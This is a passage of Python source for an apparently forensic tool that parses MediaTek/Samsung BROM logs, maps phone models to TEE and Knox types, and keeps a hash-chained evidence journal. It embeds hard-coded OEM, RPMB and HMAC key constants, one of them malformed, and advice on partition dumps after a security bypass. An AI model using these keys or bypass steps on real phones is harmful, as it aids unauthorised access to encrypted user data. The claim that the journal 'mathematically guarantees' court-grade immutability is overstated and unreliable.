"""

import argparse, json, re, sys, os, csv, datetime, time, struct, hashlib, math, binascii, mmap, subprocess, threading, gc
from pathlib import Path
from collections import Counter, deque
from io import StringIO
from dataclasses import dataclass, field
from enum import Enum, auto

sys.path = [p for p in sys.path if "extracted" not in p.lower()]

try:
    from PyQt6.QtWidgets import (
        QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
        QTextEdit, QPushButton, QLabel, QFileDialog, QMessageBox,
        QStatusBar, QFrame, QSplitter, QGroupBox, QCheckBox, QComboBox,
        QLineEdit, QTabWidget, QDialog, QDialogButtonBox, QTreeWidget,
        QTreeWidgetItem, QHeaderView, QProgressBar, QScrollArea, QGridLayout,
        QSizePolicy
    )
    from PyQt6.QtCore import Qt, QThread, pyqtSignal, QTimer, QObject
    from PyQt6.QtGui import QFont, QColor, QPalette, QTextCharFormat, QSyntaxHighlighter
    HAS_QT = True
except ImportError:
    HAS_QT = False
    # v13.0 — Headless-safe dummy Qt types so the single-file monolith
    # never crashes when PyQt6 is absent (e.g., Linux servers, CI).
    class QObject:
        pass
    class pyqtSignal:
        def __init__(self, *args): pass
        def connect(self, slot): pass
        def emit(self, *args): pass
    class QThread:
        def __init__(self): pass
        def start(self): pass
    class Qt:
        class Orientation:
            Horizontal = 1
            Vertical = 2
    class QTimer:
        pass

from Crypto.Cipher import AES
from Crypto.Hash import HMAC, SHA256, SHA384
from Crypto.Util.Padding import pad
from Crypto.Protocol.KDF import PBKDF2

# ═══════════════════════════════════════════════════════════════════════════
# v13.2 — REAL-SIZE HELPER (block-device + pipe/stream resilient)
# ═══════════════════════════════════════════════════════════════════════════

def _get_real_size(fd: int) -> int:
    """v13.2 — Return the true byte size of whatever the fd points at.

    Block devices like /dev/sdb (Linux/macOS) or Windows PhysicalDrive paths
    report size 0 to os.fstat() / os.path.getsize(), which in turn poisons
    mmap.mmap(fd, 0) → ValueError("cannot mmap an empty file") and every
    (processed / total_size) progress calculation → ZeroDivisionError.

    v13.2 FIX-01 (Pipe/Stream Resilience): non-seekable fds (/dev/null,
    stdin pipes, FIFOs, sockets) make os.lseek raise OSError(EINVAL/ESPIPE)
    — "Illegal seek" — which used to crash the core. We now catch that
    inside the helper and fall back to os.fstat(fd).st_size, which always
    succeeds on any POSIX/Windows fd. Worst case (pipe with no size): the
    fstat path returns 0, callers' existing 0-guards take over cleanly.

    The lseek-first / fstat-fallback ordering is intentional: lseek is the
    only path that returns the REAL size of a block device (the whole point
    of v13.1 FIX-01); fstat is the only path that survives unseekable fds.
    """
    # v13.2: lseek bypasses the block-device fstat trap …
    try:
        current = os.lseek(fd, 0, os.SEEK_CUR)
        size = os.lseek(fd, 0, os.SEEK_END)
        os.lseek(fd, current, os.SEEK_SET)
        if size and size > 0:
            return int(size)
    except OSError:
        # v13.2 FIX-01: Illegal seek on /dev/null, pipes, sockets, etc.
        # Fall through to fstat() which always succeeds for any open fd.
        pass
    except (ValueError, TypeError):
        # Defensive: fd was None, negative, or otherwise broken.
        return 0
    # v13.2 FIX-01: fstat() fallback for unseekable streams.
    try:
        return int(os.fstat(fd).st_size)
    except (OSError, ValueError, TypeError):
        return 0


# ═══════════════════════════════════════════════════════════════════════════
# v12.0 — FORENSIC DETERMINISM ARCHITECTURE
# ═══════════════════════════════════════════════════════════════════════════

class ForensicState(Enum):
    """Strict state machine for forensic workflow determinism.
    DETECTED   → raw data observed (file loaded, log pasted)
    PROFILED   → hardware capability matrix populated from hard proof
    VALIDATED  → keys / offsets verified against known-good patterns
    READY      → all prerequisites met; execution permitted
    """
    DETECTED = auto()
    PROFILED = auto()
    VALIDATED = auto()
    READY = auto()


class TEEType(Enum):
    """Deterministic TEE classification — no string guessing."""
    UNKNOWN = auto()
    TEEGRIS = auto()
    KINIBI = auto()
    QSEE = auto()
    TRUSTONIC = auto()
    OPTEE = auto()


class FBEVersion(Enum):
    """Deterministic FBE version — populated from binary structs, not heuristics."""
    UNKNOWN = auto()
    V1 = auto()
    V2 = auto()
    V2_WRAPPED = auto()  # hardware-wrapped keys (StrongBox / TEE)


@dataclass
class HardwareCapabilityMatrix:
    """v12.0 — Single source of truth for hardware forensic capabilities.
    Populated ONLY from hard binary evidence (struct unpacks, magic signatures).
    No field is ever 'guessed' from log text heuristics.
    """
    # Populated from SEC / TEE binary analysis
    tee_type: TEEType = TEEType.UNKNOWN
    tee_version: str = ""
    tee_compile_date: str = ""
    tz_header_type: str = ""

    # Populated from metadata.img / keyrefuge.bin struct analysis
    fbe_version: FBEVersion = FBEVersion.UNKNOWN
    inline_crypto_engine_present: bool = False
    hardware_wrapped_keys: bool = False
    knox_vault_present: bool = False

    # Populated from SEC binary or log-derived chip_id
    chip_id: str = ""
    chip_name: str = ""
    hw_code: int = 0

    # Populated from SEC binary struct extraction
    knox_warranty_tripped: bool = False
    oem_lock_state: str = "UNKNOWN"
    rollback_version: int = 0
    avb_version: int = 0

    # Source of truth tracking
    sources: dict = field(default_factory=dict)

    def set_field(self, name: str, value, source: str):
        """Set a field with mandatory provenance annotation."""
        if hasattr(self, name):
            setattr(self, name, value)
            self.sources[name] = source

    def get_readiness_report(self) -> dict:
        """v13.0 — Detailed forensic state report for diagnostics.
        Does NOT block execution; use targeted capability queries instead."""
        checks = {
            "chip_id_populated": self.chip_id != "",
            "chip_name_populated": self.chip_name != "",
            "hw_code_populated": self.hw_code != 0,
            "tee_type_known": self.tee_type != TEEType.UNKNOWN,
            "tee_version_populated": self.tee_version != "",
            "tz_header_known": self.tz_header_type != "",
            "fbe_version_known": self.fbe_version != FBEVersion.UNKNOWN,
            "inline_crypto_known": self.inline_crypto_engine_present is not None,
            "oem_lock_known": self.oem_lock_state != "UNKNOWN",
            "rollback_version_known": self.rollback_version > 0,
            "avb_version_known": self.avb_version > 0,
        }
        missing = [k for k, v in checks.items() if not v]
        return {
            "ready": len(missing) == 0,
            "missing": missing,
            "details": checks,
        }

    def is_ready(self) -> bool:
        """v13.0 — Minimal baseline readiness. Only requires core identity.
        Tabs/Engines request their own specific prerequisites via targeted
        capability methods (can_synthesize_payload, can_decrypt_offline)."""
        return self.chip_id != ""

    def can_synthesize_payload(self) -> bool:
        """v13.0 — ArsenalTab prerequisite: hw_code + tee_type from hard binary."""
        return (
            self.hw_code != 0
            and self.tee_type != TEEType.UNKNOWN
        )

    def can_decrypt_offline(self) -> bool:
        """v13.0 — DecryptionTab prerequisite: FBE version known.
        Actual key validity is checked at command-generation time."""
        return self.fbe_version != FBEVersion.UNKNOWN


@dataclass(frozen=True)
class ForensicJournalEntry:
    """v13.0 — Immutable blockchain-linked record for court-acceptable traceability.
    Each entry cryptographically chains to the previous via SHA-256.
    """
    timestamp: str
    event_type: str
    file_path: str
    sha256_hash: str
    size_bytes: int
    notes: str = ""
    previous_hash: str = "0" * 64
    current_hash: str = ""


class ForensicJournal(QObject):
    """v13.0 — Cryptographic Blockchain Journal (Chained Hashing) + Auto-Commit Vault.
    Append-only evidence log where every entry includes a previous_hash and
    a current_hash = SHA-256(timestamp + event_type + file_path + sha256 +
    size_bytes + notes + previous_hash). Tampering with any entry breaks the
    entire chain, mathematically guaranteeing immutability for international courts.
    v12.4 FIX: Every entry is immediately flushed to .omnimtk_audit_vault.log
    so a crash cannot vaporize the Chain of Custody.
    v12.5 FIX: Vault write failures emit vault_write_failed(signal) so the
    investigator is NEVER falsely assured the audit trail is secure.
    v13.0 FIX: Dummy QObject/pyqtSignal fallback for headless servers (no Qt).
    """
    vault_write_failed = pyqtSignal(str)
    GENESIS_HASH: str = "0" * 64
    VAULT_FILENAME: str = ".omnimtk_audit_vault.log"

    def __init__(self, vault_path: str | None = None):
        super().__init__()
        self._entries: list[ForensicJournalEntry] = []
        self._lock = threading.Lock()
        # v13.0 FIX: Session-isolated vault filename prevents multi-process
        # PermissionError on Windows and blockchain corruption on Linux.
        if vault_path:
            self._vault_path = Path(vault_path)
        else:
            ts = time.strftime("%Y%m%d_%H%M%S")
            pid = os.getpid()
            self._vault_path = Path(f".omnimtk_audit_vault_{ts}_{pid}.log")

    @property
    def entries(self) -> tuple[ForensicJournalEntry, ...]:
        """Immutable read-only view of the blockchain."""
        with self._lock:
            return tuple(self._entries)

    def _compute_hash(self, entry: ForensicJournalEntry) -> str:
        payload = (
            f"{entry.timestamp}|{entry.event_type}|{entry.file_path}|"
            f"{entry.sha256_hash}|{entry.size_bytes}|{entry.notes}|{entry.previous_hash}"
        )
        return hashlib.sha256(payload.encode("utf-8")).hexdigest()

    def _append_to_vault(self, entry: ForensicJournalEntry) -> None:
        """v13.0 — Flush entry to hidden audit vault for crash resilience.
        On failure, emits vault_write_failed so the GUI can alert the analyst."""
        try:
            with open(self._vault_path, "a", encoding="utf-8") as vf:
                vf.write(
                    f"{entry.timestamp}|{entry.event_type}|{entry.file_path}|"
                    f"{entry.sha256_hash}|{entry.size_bytes}|{entry.notes}|"
                    f"{entry.previous_hash}|{entry.current_hash}\n"
                )
        except (OSError, IOError) as e:
            # v13.0: Silent swallow is forensic treason. Alert the operator.
            self.vault_write_failed.emit(str(e))

    def record(self, event_type: str, file_path: str, data: bytes | None = None,
               size_bytes: int = 0, notes: str = "") -> str:
        ts = datetime.datetime.now(datetime.timezone.utc).isoformat()
        sha = ""
        if data is not None:
            sha = hashlib.sha256(data).hexdigest()
            size_bytes = len(data)
        with self._lock:
            prev_hash = self._entries[-1].current_hash if self._entries else self.GENESIS_HASH
            # Build temporary entry to compute hash
            tmp = ForensicJournalEntry(
                timestamp=ts, event_type=event_type,
                file_path=file_path, sha256_hash=sha,
                size_bytes=size_bytes, notes=notes,
                previous_hash=prev_hash, current_hash=""
            )
            current_hash = self._compute_hash(tmp)
            entry = ForensicJournalEntry(
                timestamp=ts, event_type=event_type,
                file_path=file_path, sha256_hash=sha,
                size_bytes=size_bytes, notes=notes,
                previous_hash=prev_hash, current_hash=current_hash
            )
            self._entries.append(entry)
            self._append_to_vault(entry)
            return current_hash

    def validate_chain(self) -> tuple[bool, str]:
        """Returns (is_valid, first_broken_hash_or_empty).
        A broken chain proves tampering occurred since the last valid entry."""
        with self._lock:
            if not self._entries:
                return True, ""
            for i, entry in enumerate(self._entries):
                expected_prev = self._entries[i - 1].current_hash if i > 0 else self.GENESIS_HASH
                if entry.previous_hash != expected_prev:
                    return False, entry.current_hash
                computed = self._compute_hash(entry)
                if entry.current_hash != computed:
                    return False, entry.current_hash
            return True, ""

    def to_text(self) -> str:
        lines = [
            "═" * 72,
            "  FORENSIC JOURNAL  v13.0 — Blockchain Evidence Log (Court-Acceptable)",
            "═" * 72,
            "  Integrity: Each entry chains SHA-256(previous_hash) → current_hash",
            "  Genesis  : " + self.GENESIS_HASH,
            ""
        ]
        for e in self.entries:
            lines.append(f"[{e.timestamp}]  {e.event_type}")
            lines.append(f"  File : {e.file_path}")
            lines.append(f"  Size : {e.size_bytes:,} bytes")
            lines.append(f"  SHA-256: {e.sha256_hash}")
            lines.append(f"  Prev   : {e.previous_hash}")
            lines.append(f"  Curr   : {e.current_hash}")
            if e.notes:
                lines.append(f"  Notes: {e.notes}")
            lines.append("")
        valid, broken = self.validate_chain()
        lines.append("═" * 72)
        lines.append(
            f"  CHAIN VALIDITY: {'VALID — tamper-proof' if valid else 'BROKEN at hash ' + broken}"
        )
        lines.append("═" * 72)
        return "\n".join(lines)


# ═══════════════════════════════════════════════════════════════════════════
# v12.4 — ASYNC FULL-FILE FORENSIC HASHING + CANCELLATION
# ═══════════════════════════════════════════════════════════════════════════

class HashWorker(QThread):
    """v12.2 — Background SHA-256 hasher with OSError resilience + cancellation.
    Reads files in 4MB chunks to avoid loading multi-GB dumps into RAM.
    Emits progress (0-100) and finished(hash), error(msg), or cancelled().
    """
    progress = pyqtSignal(int)
    finished = pyqtSignal(str)
    error    = pyqtSignal(str)
    cancelled = pyqtSignal()   # v12.2: safe cancellation notification

    CHUNK_SIZE = 4 * 1024 * 1024  # 4 MB

    def __init__(self, file_path: str):
        super().__init__()
        self.file_path = file_path
        self._cancelled = False
        self._lock = threading.Lock()  # v12.2: thread-safe cancel flag

    def cancel(self):
        """v12.2: Request cooperative cancellation from any thread."""
        with self._lock:
            self._cancelled = True

    def run(self):
        try:
            hasher = hashlib.sha256()
            processed = 0
            with open(self.file_path, "rb") as f:
                # v13.1 FIX-02: bypass the os.path.getsize() / fstat() trap.
                # Block devices (/dev/sdb, \\.\PhysicalDrive0) report size 0,
                # which used to throw ZeroDivisionError on the first chunk
                # progress calc, silently kill the thread, and freeze the GUI.
                total_size = _get_real_size(f.fileno())
                while True:
                    # v12.2: poll cancellation flag before each chunk read
                    with self._lock:
                        if self._cancelled:
                            self.cancelled.emit()
                            return
                    try:
                        chunk = f.read(self.CHUNK_SIZE)
                    except OSError as e:
                        self.error.emit(f"Disk I/O failure during hash: {e}")
                        return
                    if not chunk:
                        break
                    hasher.update(chunk)
                    processed += len(chunk)
                    # v13.1 FIX-02: explicit > 0 guard against any residual
                    # ZeroDivisionError on unseekable / truly-empty inputs.
                    if total_size > 0:
                        pct = int((processed / total_size) * 100)
                        if pct > 100:
                            pct = 100
                        self.progress.emit(pct)
            if total_size == 0:
                # v13.1 FIX-02: genuinely empty / unseekable input — emit 100%
                # so the UI does not get stuck at 0% with no completion signal.
                self.progress.emit(100)
            self.finished.emit(hasher.hexdigest())
        except Exception as e:
            self.error.emit(str(e))


# ═══════════════════════════════════════════════════════════════════════════
# CRYPTOGRAPHIC CONSTANTS
# ═══════════════════════════════════════════════════════════════════════════

OEM_KEYS = {
    "MTK_ME_ID":    {"key_hex": "9739FC6B362BFA4A6D261D82DBDD15A1",                                 "key_size": 16},
    "MTK_ITRUSTEE": {"key_hex": "DDF9F70CEA9A64EBFE3D7B0F4D623FA5866A358F028D05FEFAD50BE872895440", "key_size": 32},
    "MTK_RPMBKEY":  {"key_hex": "08c813557f97baa8dcc912bc12062dc50eded0cf8467408b077f88bd47c7fdb9", "key_size": 32},
}

MT6789_PBKDF2_ITERATIONS = 15000
MT6789_RPMB_KEY_LENGTH   = 32

MEMORY_OFFSETS = {
    "ME_ID_PRIMARY":    0x103000,
    "ME_ID_ALT":        0x102FE0,
    "LOCK_STATE":       0x103300,
    "ROLLBACK_INDEX":   0x103304,
    "ANTI_ROLLBACK_VER":0x103308,
    "SECURE_BOOT_HASH": 0x103400,
    "EMI_CONFIG":       0x102000,
}

PARTITION_OFFSETS = {
    "proinfo_rpmb_seed": 0x8000,
    "seccfg_lock_state": 0x200,
    "devinfo_prov_key":  0x100,
    "nvdata_rpmb_ctr":   0x400,
}

HMAC_KEYS = {
    "default":   "2F172F7E8BD281AE87E0E602F0BE6153BE5B51D84AC25264EDAA14569915FE09",
    "mt6789_g99":"3A283F809CE392BF98F170713C1CF7264CF62E95DB36375FEBB2567AA26CF1A",
    "next_gen":  "PLACEHOLDER_NEXTGEN_HMAC_KEY_64HEX_00000000000000000000000000000000",
}

STATIC_DATA = {
    "MTK_RPMB2KEY": "FB91625C7A3CAAA137A3D8DF4EB89C30",
    "MTK_HRID":     "36D256CEDD00576025F5497BA54361E5",
    "MTK_CID":      "7A2524E6A41CFA04EBF1C5BEF41EE928",
    "MTK_RID":      "4839485131354143504d424441520000",
    "MTK_FDEKEY":   "EC50E84EE317105590B2D3AC45FF9096",
}

_PLACEHOLDER_32      = "00000000000000000000000000000000"
_KNOWN_GOOD_MEID     = "686D3BA6F9345B152DA1326BF5A5B7A4"
_KNOWN_GOOD_ITRUSTEE = "72921119d5201bf5c270c1c53fff97d7"

# ═══════════════════════════════════════════════════════════════════════════
# FEATURE 1 — SAMSUNG DEVICE DATABASE
# ══════════════   ════════════════════════════════════════════════════════════
#
# Maps Samsung model prefixes to: chip, Knox version, TEE type, FBE type,
# RPMB key derivation path, Android version at launch.
#
# Knox versions:
#   3.x  → TEEGRIS (Samsung custom TEE, Keymaster 4+)
#   2.x  → Kinibi / Trustonic TEE
#   N/A  → No Knox or Legacy
#
# TEE types:
#   TEEGRIS  → Samsung-developed TEE (Galaxy A32 5G and later MTK)
#   KINIBI   → Trustonic/Gemalto TEE (older Samsung MTK)
#   UNKNOWN  → Cannot determine from model alone
#
# RPMB path:
#   SAMSUNG_KNOX  → Samsung Hardware-Backed key (Knox Vault, not derivable externally)
#   MTK_STANDARD  → Standard MTK RPMB derivation may apply
# ─────────────────────────────────────────────────────────────────────────

SAMSUNG_MODEL_DB = {
    # ── Galaxy A Series (MTK) ─────────────────────────────────────────────
    "SM-A032":  {"chip":"MT6765", "knox":"2.8", "tee":"KINIBI",  "fbe":"v1",   "rpmb":"MTK_STANDARD",  "android":11},
    "SM-A035":  {"chip":"MT6765", "knox":"3.0", "tee":"TEEGRIS", "fbe":"v2",   "rpmb":"SAMSUNG_KNOX",  "android":11},
    "SM-A037":  {"chip":"MT6765", "knox":"3.0", "tee":"TEEGRIS", "fbe":"v2",   "rpmb":"SAMSUNG_KNOX",  "android":12},
    "SM-A042":  {"chip":"MT6765", "knox":"3.0", "tee":"TEEGRIS", "fbe":"v2",   "rpmb":"SAMSUNG_KNOX",  "android":11},
    "SM-A047":  {"chip":"MT6769", "knox":"3.0", "tee":"TEEGRIS", "fbe":"v2",   "rpmb":"SAMSUNG_KNOX",  "android":12},
    "SM-A125":  {"chip":"MT6765", "knox":"2.8", "tee":"KINIBI",  "fbe":"v1",   "rpmb":"MTK_STANDARD",  "android":10},
    "SM-A127":  {"chip":"MT6765", "knox":"3.0", "tee":"TEEGRIS", "fbe":"v2",   "rpmb":"SAMSUNG_KNOX",  "android":11},
    "SM-A135":  {"chip":"MT6769", "knox":"3.0", "tee":"TEEGRIS", "fbe":"v2",   "rpmb":"SAMSUNG_KNOX",  "android":12},
    "SM-A137":  {"chip":"MT6769", "knox":"3.0", "tee":"TEEGRIS", "fbe":"v2",   "rpmb":"SAMSUNG_KNOX",  "android":12},
    "SM-A145":  {"chip":"MT6769", "knox":"3.0", "tee":"TEEGRIS", "fbe":"v2",   "rpmb":"SAMSUNG_KNOX",  "android":12},
    "SM-A146":  {"chip":"MT6877", "knox":"3.1", "tee":"TEEGRIS", "fbe":"v2",   "rpmb":"SAMSUNG_KNOX",  "android":13},
    "SM-A155":  {"chip":"MT6877", "knox":"3.1", "tee":"TEEGRIS", "fbe":"v2",   "rpmb":"SAMSUNG_KNOX",  "android":14},
    "SM-A225":  {"chip":"MT6769", "knox":"3.0", "tee":"TEEGRIS", "fbe":"v2",   "rpmb":"SAMSUNG_KNOX",  "android":11},
    "SM-A235":  {"chip":"MT6769", "knox":"3.0", "tee":"TEEGRIS", "fbe":"v2",   "rpmb":"SAMSUNG_KNOX",  "android":12},
    "SM-A245":  {"chip":"MT6877", "knox":"3.0", "tee":"TEEGRIS", "fbe":"v2",   "rpmb":"SAMSUNG_KNOX",  "android":12},
    "SM-A346":  {"chip":"MT6877", "knox":"3.1", "tee":"TEEGRIS", "fbe":"v2",   "rpmb":"SAMSUNG_KNOX",  "android":13},
    "SM-A356":  {"chip":"MT6877", "knox":"3.1", "tee":"TEEGRIS", "fbe":"v2",   "rpmb":"SAMSUNG_KNOX",  "android":14},
    "SM-A546":  {"chip":"MT6877", "knox":"3.1", "tee":"TEEGRIS", "fbe":"v2",   "rpmb":"SAMSUNG_KNOX",  "android":13},
    "SM-A556":  {"chip":"MT6877", "knox":"3.2", "tee":"TEEGRIS", "fbe":"v2",   "rpmb":"SAMSUNG_KNOX",  "android":14},
    # ── Galaxy M Series (MTK) ─────────────────────────────────────────────
    "SM-M127":  {"chip":"MT6765", "knox":"3.0", "tee":"TEEGRIS", "fbe":"v2",   "rpmb":"SAMSUNG_KNOX",  "android":11},
    "SM-M135":  {"chip":"MT6769", "knox":"3.0", "tee":"TEEGRIS", "fbe":"v2",   "rpmb":"SAMSUNG_KNOX",  "android":12},
    "SM-M146":  {"chip":"MT6877", "knox":"3.1", "tee":"TEEGRIS", "fbe":"v2",   "rpmb":"SAMSUNG_KNOX",  "android":13},
    "SM-M236":  {"chip":"MT6877", "knox":"3.1", "tee":"TEEGRIS", "fbe":"v2",   "rpmb":"SAMSUNG_KNOX",  "android":12},
    "SM-M336":  {"chip":"MT6877", "knox":"3.1", "tee":"TEEGRIS", "fbe":"v2",   "rpmb":"SAMSUNG_KNOX",  "android":13},
    "SM-M536":  {"chip":"MT6877", "knox":"3.1", "tee":"TEEGRIS", "fbe":"v2",   "rpmb":"SAMSUNG_KNOX",  "android":12},
    # ── Galaxy F Series (MTK) ─────────────────────────────────────────────
    "SM-F127":  {"chip":"MT6765", "knox":"3.0", "tee":"TEEGRIS", "fbe":"v2",   "rpmb":"SAMSUNG_KNOX",  "android":11},
    "SM-F135":  {"chip":"MT6769", "knox":"3.0", "tee":"TEEGRIS", "fbe":"v2",   "rpmb":"SAMSUNG_KNOX",  "android":12},
    # ── Galaxy Tab (MTK) ──────────────────────────────────────────────────
    "SM-T220":  {"chip":"MT8168", "knox":"3.0", "tee":"TEEGRIS", "fbe":"v2",   "rpmb":"SAMSUNG_KNOX",  "android":11},
    "SM-T225":  {"chip":"MT8168", "knox":"3.0", "tee":"TEEGRIS", "fbe":"v2",   "rpmb":"SAMSUNG_KNOX",  "android":11},
    "SM-T290":  {"chip":"MT6739", "knox":"2.8", "tee":"KINIBI",  "fbe":"v1",   "rpmb":"MTK_STANDARD",  "android":9},
    "SM-T295":  {"chip":"MT6739", "knox":"2.8", "tee":"KINIBI",  "fbe":"v1",   "rpmb":"MTK_STANDARD",  "android":9},
    "SM-X110":  {"chip":"MT8781", "knox":"3.1", "tee":"TEEGRIS", "fbe":"v2",   "rpmb":"SAMSUNG_KNOX",  "android":13},
    "SM-X115":  {"chip":"MT8781", "knox":"3.1", "tee":"TEEGRIS", "fbe":"v2",   "rpmb":"SAMSUNG_KNOX",  "android":13},
}

# Knox security flags meaning
KNOX_SEC_FLAGS = {
    "SBC": "Secure Boot Chain — Bootloader integrity verified",
    "DAA": "Download Agent Authentication — DA must be signed",
    "SLA": "Software-Level Authentication",
    "MEL": "MTK Encryption Lock — full disk encryption enforced",
    "RPMB_LOCK": "RPMB partition locked — key enrolled",
    "TEEGRIS": "Samsung TEEGRIS TEE active",
    "KINIBI": "Trustonic Kinibi TEE active",
}

def lookup_samsung_model(model_str: str) -> dict | None:
    """
    Returns Samsung model info dict or None.
    Matches on prefix (SM-A346E matches SM-A346 entry).
    """
    if not model_str:
        return None
    upper = model_str.strip().upper()
    for prefix, info in SAMSUNG_MODEL_DB.items():
        if upper.startswith(prefix.upper()):
            return {**info, "model_prefix": prefix, "full_model": upper}
    return None


# ═══════════════════════════════════════════════════════════════════════════
# FEATURE 3 — KNOX / TEEGRIS DETECTION ENGINE
# ═══════════════════════════════════════════════════════════════════════════

class KnoxAnalyzer:
    """
    Analyzes Pandora/UFI/BROM logs for Knox-specific information.
    Detects: Knox version, TEE type, security flags, warranty fuse status,
    TEEGRIS vs Kinibi, bootloader lock state, and FBE presence.
    """

    _SEC_FLAG_RE  = re.compile(r'Active\s+sec\s+flags\s*:\s*\[([^\]]*)\]', re.I)
    _SEC_CFG_RE   = re.compile(r'sec\s+config[^\[]*\[\s*([0-9A-Fa-f]{8})\s*\]', re.I)
    _MODEL_RE     = re.compile(r'Product\s+Model\s*:\s*(SM-[A-Z0-9]+)', re.I)
    _BRAND_RE     = re.compile(r'Product\s+Brand\s*:\s*(\S+)', re.I)
    _FW_VER_RE    = re.compile(r'Firmware\s+Version\s*:\s*([A-Z0-9]+)', re.I)
    _USERDATA_FS  = re.compile(r'Userdata\s+FS\s+Type\s*:\s*(\S+)', re.I)
    _BOARD_PLAT   = re.compile(r'Board\s+Platform\s*:\s*(\S+)', re.I)
    _BUILD_DATE   = re.compile(r'Build\s+Date\s*:\s*(.+)', re.I)
    _AB_STATE_RE  = re.compile(r'Checking\s+A/B\s+state\s*\.\.\.\s*(\w+)', re.I)
    _HW_VER_RE    = re.compile(r'HW\s+VER\s*:\s*([0-9A-Fa-f]+)', re.I)
    _HW_CODE_RE   = re.compile(r'HW\s+code\s+from\s+device\s*\.\.\.\s*([0-9A-Fa-f]+)', re.I)
    _UFS_CID_RE   = re.compile(r'UFS_CID\s*:\s*(\S+)', re.I)
    _SOC_ID_RE    = re.compile(r'(?:SOC\s*ID|Get\s+SOC\s+ID)\s*[:\.\[]*\s*\[?\s*([0-9A-Fa-f]{64})', re.I)
    _BYPASS_RE    = re.compile(r'(?:Advanced\s+Bypass\s+Security|Bypass\s+Security)\s*\.\.\.\s*(\w+)', re.I)

    @classmethod
    def analyze(cls, log_text: str) -> dict:
        result = {
            "is_samsung": False,
            "model": None,
            "brand": None,
            "firmware_version": None,
            "tee_type": "UNKNOWN",
            "knox_version": "UNKNOWN",
            "rpmb_path": "UNKNOWN",
            "sec_flags_raw": [],
            "sec_flags_decoded": {},
            "sec_config_hex": None,
            "sbc_active": False,
            "daa_active": False,
            "userdata_fs": None,
            "fbe_active": False,
            "f2fs_encryption": False,
            "board_platform": None,
            "build_date": None,
            "ab_state": None,
            "hw_ver": None,
            "hw_code": None,
            "ufs_cid": None,
            "soc_id_raw": None,
            "bypass_status": None,
            "model_db_entry": None,
            "key_derivation_feasibility": "UNKNOWN",
            "recommendations": [],
            "warnings": [],
        }

        # Brand detection
        m = cls._BRAND_RE.search(log_text)
        if m:
            result["brand"] = m.group(1).strip().lower()
            if result["brand"] == "samsung":
                result["is_samsung"] = True

        if not result["is_samsung"]:
            # Secondary check — model prefix
            m2 = cls._MODEL_RE.search(log_text)
            if m2 and m2.group(1).upper().startswith("SM-"):
                result["is_samsung"] = True

        # Model
        m = cls._MODEL_RE.search(log_text)
        if m:
            result["model"] = m.group(1).strip().upper()
            db_entry = lookup_samsung_model(result["model"])
            if db_entry:
                result["model_db_entry"] = db_entry
                result["tee_type"]    = db_entry["tee"]
                result["knox_version"]= db_entry["knox"]
                result["rpmb_path"]   = db_entry["rpmb"]

        # Security flags
        for m in cls._SEC_FLAG_RE.finditer(log_text):
            flags_str = m.group(1).strip()
            flags = [f.strip() for f in flags_str.split() if f.strip()]
            result["sec_flags_raw"].extend(flags)

        result["sec_flags_raw"] = list(set(result["sec_flags_raw"]))
        for flag in result["sec_flags_raw"]:
            result["sec_flags_decoded"][flag] = KNOX_SEC_FLAGS.get(flag, f"Unknown flag: {flag}")

        result["sbc_active"] = "SBC" in result["sec_flags_raw"]
        result["daa_active"] = "DAA" in result["sec_flags_raw"]

        # Sec config hex
        m = cls._SEC_CFG_RE.search(log_text)
        if m:
            result["sec_config_hex"] = m.group(1).upper()

        # Firmware version
        m = cls._FW_VER_RE.search(log_text)
        if m:
            result["firmware_version"] = m.group(1).strip()

        # Userdata FS / FBE
        m = cls._USERDATA_FS.search(log_text)
        if m:
            result["userdata_fs"] = m.group(1).strip().upper()
            result["fbe_active"]  = result["userdata_fs"] in ("F2FS", "EXT4")
            result["f2fs_encryption"] = result["userdata_fs"] == "F2FS"

        # Board platform
        m = cls._BOARD_PLAT.search(log_text)
        if m:
            result["board_platform"] = m.group(1).strip().lower()

        # Build date
        m = cls._BUILD_DATE.search(log_text)
        if m:
            result["build_date"] = m.group(1).strip()

        # A/B state
        m = cls._AB_STATE_RE.search(log_text)
        if m:
            result["ab_state"] = m.group(1).strip().lower()

        # HW info
        m = cls._HW_VER_RE.search(log_text)
        if m:
            result["hw_ver"] = m.group(1).strip().upper()

        m = cls._HW_CODE_RE.search(log_text)
        if m:
            result["hw_code"] = m.group(1).strip().upper()

        # UFS CID
        m = cls._UFS_CID_RE.search(log_text)
        if m:
            result["ufs_cid"] = m.group(1).strip()

        # SOC ID
        m = cls._SOC_ID_RE.search(log_text)
        if m:
            result["soc_id_raw"] = m.group(1).strip().upper()

        # Bypass status
        m = cls._BYPASS_RE.search(log_text)
        if m:
            result["bypass_status"] = m.group(1).strip().upper()

        # ── Key derivation feasibility assessment ──────────────────────────
        result["key_derivation_feasibility"], recs, warns = cls._assess_feasibility(result)
        result["recommendations"] = recs
        result["warnings"] = warns

        return result

    @classmethod
    def _assess_feasibility(cls, r: dict) -> tuple:
        recs, warns = [], []
        tee = r.get("tee_type", "UNKNOWN")
        rpmb = r.get("rpmb_path", "UNKNOWN")
        bypass = r.get("bypass_status", "")

        if tee == "TEEGRIS":
            warns.append("TEEGRIS TEE detected — FBE master key lives inside Knox Vault.")
            warns.append("External key derivation NOT possible via standard MTK path.")
            warns.append("Knox Vault is hardware-isolated; keys never leave TEE in plaintext.")
            recs.append("Dump: proinfo, seccfg, sec, keystore partitions for metadata analysis.")
            recs.append("Cross-reference SOC_ID with known Knox bypass research databases.")
            recs.append("Check Knox warranty bit status via sec_config_hex field.")
            feasibility = "PARTIAL — BROM accessible, FBE keys Knox-protected"
        elif tee == "KINIBI":
            warns.append("Kinibi (Trustonic) TEE detected — older, more research available.")
            recs.append("Trustonic TAs may be extractable via TA dump techniques.")
            recs.append("Check for Kinibi exploit vectors relevant to this Knox version.")
            feasibility = "PARTIAL — Kinibi TEE, research techniques may apply"
        else:
            feasibility = "UNKNOWN — TEE type not determined"

        if rpmb == "SAMSUNG_KNOX":
            warns.append("RPMB key is Samsung Knox Hardware-backed — NOT derivable from ME_ID alone.")
        elif rpmb == "MTK_STANDARD":
            recs.append("RPMB may follow standard MTK derivation — try standard path.")

        if bypass and bypass.upper() == "OK":
            recs.append("BROM bypass successful — partition dump is possible.")
            recs.append("Priority dumps: sec, keystorage, nvdata, proinfo, seccfg")
        
        if r.get("sbc_active") and r.get("daa_active"):
            warns.append("SBC+DAA active: Secure Boot Chain + DA authentication enforced.")

        return feasibility, recs, warns


# ═══════════════════════════════════════════════════════════════════════════
# FEATURE 4 — SAMSUNG SOC_ID ADVANCED ANALYZER
# ═══════════════════════════════════════════════════════════════════════════

